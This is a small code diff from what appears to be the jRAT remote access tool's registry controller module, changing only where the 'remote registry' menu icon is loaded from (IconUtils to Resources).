@@ -1,7 +1,7 @@
 package jrat.module.registry;
 
 import jrat.api.Module;
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.AbstractSlave;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPackets;
@@ -31,7 +31,7 @@ public class RegistryControllerModule extends Module {
                 }
             }
         });
-        mntmRemoteRegistry.setIcon(IconUtils.getIcon("registry"));
+        mntmRemoteRegistry.setIcon(Resources.getIcon("registry"));
 
         Frame.panelClients.mnQuickOpen.add(mntmRemoteRegistry);
     }
